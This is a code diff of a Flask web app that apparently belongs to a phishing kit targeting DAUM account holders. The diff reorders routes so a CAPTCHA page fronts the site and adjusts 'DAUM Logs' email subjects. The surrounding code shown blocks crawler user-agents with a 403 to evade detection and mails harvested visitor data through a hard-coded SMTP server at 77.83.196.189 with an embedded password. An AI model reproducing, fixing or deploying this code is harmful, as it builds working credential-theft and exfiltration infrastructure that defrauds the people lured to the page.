@@ -77,7 +77,7 @@ bot_user_agents = [
 "crawler"
 ]
 
-@app.route('/m', methods=['GET', 'POST'])
+@app.route('/', methods=['GET', 'POST'])
 def captcha():
 
     if request.method == 'GET':
@@ -124,7 +124,7 @@ def success():
         return redirect(url_for('captcha'))
 
 
-@app.route("/")
+@app.route("/m")
 def route2():
     web_param = request.args.get('web')
     if web_param:
@@ -151,7 +151,7 @@ def first():
         password = "vip6ebdd04ea6df"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "DAUM Logs !"
+        message["Subject"] = "daum Logs !"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -167,7 +167,7 @@ def first():
         with smtplib.SMTP("77.83.196.189", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('benza', web=session.get('eman'))
+        return redirect(url_for('benza', web=session.get('eman')))
 
 
 
@@ -189,7 +189,7 @@ def second():
         password = "vip6ebdd04ea6df"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "DAUM logs !! "
+        message["Subject"] = "duam logs !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -214,19 +214,18 @@ def benza():
     if request.method == 'GET':
         eman = session.get('eman')
         dman = session.get('ins')
-    return render_template('ind.html', eman=eman)
+    return render_template('ind.html', eman=eman, dman=dman)
 
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
     userip = request.headers.get("X-Forwarded-For")
     useragent = request.headers.get("User-Agent")
-    eman = session.get('eman')
-    dman = session.get('dman')
+    
     if useragent in bot_user_agents:
         abort(403)  # forbidden
     
     if request.method == 'GET':
-        dman = session.get('dman')
+        dman = session.get('ins')
     return render_template('main.html', dman=dman)
 
 if __name__ == '__main__':
